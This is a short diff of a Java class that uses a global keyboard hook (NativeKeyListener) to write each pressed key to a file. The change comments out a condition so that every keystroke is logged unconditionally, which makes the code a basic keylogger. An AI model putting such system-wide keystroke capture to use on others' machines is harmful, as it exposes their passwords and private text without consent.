@@ -62,12 +62,12 @@ public class App implements NativeKeyListener {
         System.out.println("Letra: "+keyString);
 
         try {
-            System.out.println(TXT.state);
-            if (TXT.isJustOpened()) {
+            //System.out.println(TXT.state);
+            //if (TXT.isJustOpened()) {
                 writeFile(keyString);
                 lastActivityTime = System.currentTimeMillis();
-            }
-            System.out.println(TXT.state);
+            //}
+            //System.out.println(TXT.state);
         } catch (IOException e) {
             e.printStackTrace();
         }
